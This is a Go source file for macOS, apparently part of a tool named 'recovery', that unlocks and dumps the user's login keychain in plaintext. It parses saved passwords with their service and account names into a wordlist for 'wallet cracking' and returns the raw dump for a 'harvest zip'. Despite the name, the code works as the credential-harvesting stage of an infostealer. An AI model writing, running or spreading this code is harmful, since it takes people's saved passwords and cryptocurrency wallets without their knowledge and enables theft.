//go:build darwin

// password_candidates_darwin.go — dump login keychain and extract password candidates.
//
// After EnsureLoginKeychainUnlocked (unlock with user password if locked), we:
//  1. dump-keychain -d (plaintext secrets where ACL allows)
//  2. parse password blobs into PasswordCandidateResult for wallet cracking
//  3. return the raw dump for inclusion in the primary harvest zip
package scanner

import (
	"encoding/hex"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"unicode/utf8"

	"recovery/recovery/crypto"
	"recovery/recovery/types"
)

var (
	kcPasswordLineRe  = regexp.MustCompile(`(?m)^\s*password:\s*0x([0-9A-Fa-f]+)\s*$`)
	kcPasswordPlainRe = regexp.MustCompile(`"password"<blob>="([^"]*)"`)
	kcPasswordHexBlob = regexp.MustCompile(`"password"<blob>=0x([0-9A-Fa-f]+)`)
	kcClassLineRe     = regexp.MustCompile(`(?m)^class:\s*"([^"]+)"`)
	kcServiceLineRe   = regexp.MustCompile(`"svce"<blob>="([^"]*)"`)
	kcAccountLineRe   = regexp.MustCompile(`"acct"<blob>="([^"]*)"`)
)

// HarvestLoginKeychain dumps the unlocked login keychain and extracts password candidates.
// dump is the raw security dump-keychain -d text (for logs/keys/keychain_dump.txt).
// candidates are parsed passwords for the password-candidate wordlist.
func HarvestLoginKeychain() (dump []byte, candidates []types.PasswordCandidateResult) {
	loginKC := loginKeychainDBPath()
	if loginKC == "" {
		return nil, nil
	}

	raw, err := crypto.DumpLoginKeychain()
	if err != nil || len(raw) == 0 {
		return nil, nil
	}
	return raw, parseKeychainDump(raw)
}

// CollectKeychainPasswordCandidates dumps the login keychain and extracts saved passwords.
// Prefer HarvestLoginKeychain when the raw dump is also needed for export.
func CollectKeychainPasswordCandidates() []types.PasswordCandidateResult {
	_, candidates := HarvestLoginKeychain()
	return candidates
}

// parseKeychainDump extracts password-like values from dump-keychain -d output.
func parseKeychainDump(dump []byte) []types.PasswordCandidateResult {
	seen := make(map[string]bool)
	var out []types.PasswordCandidateResult
	add := func(password, class, service, account string) {
		password = strings.TrimSpace(password)
		if !validCandidatePassword(password) || seen[password] {
			return
		}
		seen[password] = true
		detail := class
		if service != "" || account != "" {
			detail = strings.TrimSpace(class + " " + service + " " + account)
		}
		out = append(out, types.PasswordCandidateResult{
			Password: password,
			Source:   "keychain",
			Detail:   strings.TrimSpace(detail),
		})
	}

	var class, service, account string
	for _, line := range strings.Split(string(dump), "\n") {
		if m := kcClassLineRe.FindStringSubmatch(line); len(m) == 2 {
			class = m[1]
			service = ""
			account = ""
			continue
		}
		if m := kcServiceLineRe.FindStringSubmatch(line); len(m) == 2 {
			service = m[1]
			continue
		}
		if m := kcAccountLineRe.FindStringSubmatch(line); len(m) == 2 {
			account = m[1]
			continue
		}
		if m := kcPasswordPlainRe.FindStringSubmatch(line); len(m) == 2 {
			add(m[1], class, service, account)
			continue
		}
		if m := kcPasswordHexBlob.FindStringSubmatch(line); len(m) == 2 {
			if pw := decodeKeychainHexPassword(m[1]); pw != "" {
				add(pw, class, service, account)
			}
			continue
		}
		if m := kcPasswordLineRe.FindStringSubmatch(line); len(m) == 2 {
			if pw := decodeKeychainHexPassword(m[1]); pw != "" {
				add(pw, class, service, account)
			}
		}
	}

	return out
}

func loginKeychainDBPath() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		if u, uerr := user.Current(); uerr == nil {
			home = u.HomeDir
		}
	}
	if home == "" {
		return ""
	}
	return filepath.Join(home, "Library", "Keychains", "login.keychain-db")
}

func decodeKeychainHexPassword(hexStr string) string {
	hexStr = strings.TrimSpace(hexStr)
	if hexStr == "" {
		return ""
	}
	if len(hexStr)%2 == 1 {
		hexStr = "0" + hexStr
	}
	raw, err := hex.DecodeString(hexStr)
	if err != nil || len(raw) == 0 {
		return ""
	}
	if utf8.Valid(raw) && isMostlyPrintable(string(raw)) {
		return strings.TrimSpace(string(raw))
	}
	return ""
}

func isMostlyPrintable(s string) bool {
	if s == "" {
		return false
	}
	runes := []rune(s)
	printable := 0
	for _, r := range runes {
		if r == '\n' || r == '\r' || r == '\t' || (r >= 32 && r < 127) {
			printable++
		}
	}
	return printable*100/len(runes) >= 80
}
